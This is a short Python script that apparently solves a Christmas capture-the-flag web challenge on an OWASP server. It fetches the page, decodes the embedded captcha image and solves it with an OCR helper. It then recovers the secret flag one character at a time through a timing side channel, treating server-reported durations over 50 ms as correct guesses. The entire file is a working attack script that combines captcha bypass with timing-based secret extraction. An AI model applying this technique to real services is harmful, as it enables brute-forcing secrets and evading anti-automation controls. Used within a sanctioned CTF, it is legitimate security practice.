#!/usr/bin/env python3

import base64
import requests
import time

from ocr import recognize_code


URL = 'http://elfs.owasp.si:3000/'
URL_CHECK = 'http://elfs.owasp.si:3000/check'
URL_SUBMIT = 'http://elfs.owasp.si:3000/submit'


r = requests.get(URL)
print(r.status_code)
# print(r.headers)
# print(r.text)

cookie = r.headers['Set-Cookie']


image_b64 = None
for line in r.text.split('\n'):
    if 'data:image/png' in line:
        image_b64 = line.split("'")[3].replace('data:image/png;base64,', '').replace('&#x3D;', '=')
        break

image = base64.b64decode(image_b64)
f = open('download.png', 'wb')
f.write(image)
f.close()


headers = {
    'Cookie': cookie,
}

data = {
    'code': recognize_code('download.png'),
}

r = requests.post(URL_CHECK, headers=headers, data=data)
print(r.status_code)
# print(r.headers)
# print(r.text)



import string
ABC = '_}{' + string.ascii_letters + string.digits + string.punctuation

flag = 'xmas'

def check_candidate(s):
    data = {
        'value': s,
        'debug': 1,
    }

    r = requests.post(URL_SUBMIT, headers=headers, data=data)
    # print(r.status_code)
    # print(r.headers)

    for line in r.text.split('\n'):
        if '<em>' in line:
            start = float(line.split(':')[1].split(',')[0])
            end = float(line.split(':')[2].split('}')[0])
            duration = end - start
            break

    if duration > 0.050:
        return True
    return False


while True:
    for a in ABC:
        candidate = flag + a
        print(a, end='', flush=True)

        if check_candidate(candidate) and check_candidate(candidate) and check_candidate(candidate):
            flag = candidate
            print()
            print('FLAG:', flag)
            break
